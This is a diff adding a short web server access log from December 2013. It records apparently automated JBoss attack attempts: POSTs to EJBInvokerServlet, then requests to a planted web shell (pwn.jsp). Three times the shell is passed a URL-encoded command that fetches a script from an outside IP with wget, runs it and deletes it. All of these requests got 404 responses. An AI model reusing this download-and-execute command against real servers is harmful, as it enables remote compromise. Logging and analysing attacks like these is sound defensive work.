@@ -1,0 +1,13 @@
+195.88.203.89 - - [21/Dec/2013:04:17:21 -0600] "HEAD / HTTP/1.0" 404 -
+174.129.242.6 - - [21/Dec/2013:04:19:21 -0600] "HEAD / HTTP/1.0" 404 -
+88.212.11.202 - - [21/Dec/2013:08:04:34 -0600] "HEAD / HTTP/1.0" 404 -
+88.212.11.202 - - [21/Dec/2013:08:04:35 -0600] "POST /invoker/EJBInvokerServlet/ HTTP/1.1" 404 1003
+88.212.11.202 - - [21/Dec/2013:08:04:40 -0600] "GET /a/pwn.jsp?cmd=wget+http%3A%2F%2F221.132.37.26%2Fscen+-O+%2Ftmp%2Fsh%3Bsh+%2Ftmp%2Fsh%3Brm+-rf+%2Ftmp%2Fsh HTTP/1.0" 404 969
+54.209.135.111 - - [21/Dec/2013:08:13:35 -0600] "HEAD / HTTP/1.0" 404 -
+81.161.243.254 - - [21/Dec/2013:08:19:19 -0600] "HEAD / HTTP/1.0" 404 -
+81.161.243.254 - - [21/Dec/2013:08:19:19 -0600] "POST /invoker/EJBInvokerServlet/ HTTP/1.1" 404 1003
+81.161.243.254 - - [21/Dec/2013:08:19:24 -0600] "GET /a/pwn.jsp?cmd=wget+http%3A%2F%2F221.132.37.26%2Fscen+-O+%2Ftmp%2Fsh%3Bsh+%2Ftmp%2Fsh%3Brm+-rf+%2Ftmp%2Fsh HTTP/1.0" 404 969
+65.242.23.108 - - [21/Dec/2013:08:19:31 -0600] "HEAD / HTTP/1.0" 404 -
+65.242.23.108 - - [21/Dec/2013:08:19:32 -0600] "POST /invoker/EJBInvokerServlet/ HTTP/1.1" 404 1003
+50.17.254.136 - - [21/Dec/2013:08:19:32 -0600] "HEAD / HTTP/1.0" 404 -
+65.242.23.108 - - [21/Dec/2013:08:19:37 -0600] "GET /a/pwn.jsp?cmd=wget+http%3A%2F%2F221.132.37.26%2Fscen+-O+%2Ftmp%2Fsh%3Bsh+%2Ftmp%2Fsh%3Brm+-rf+%2Ftmp%2Fsh HTTP/1.0" 404 969
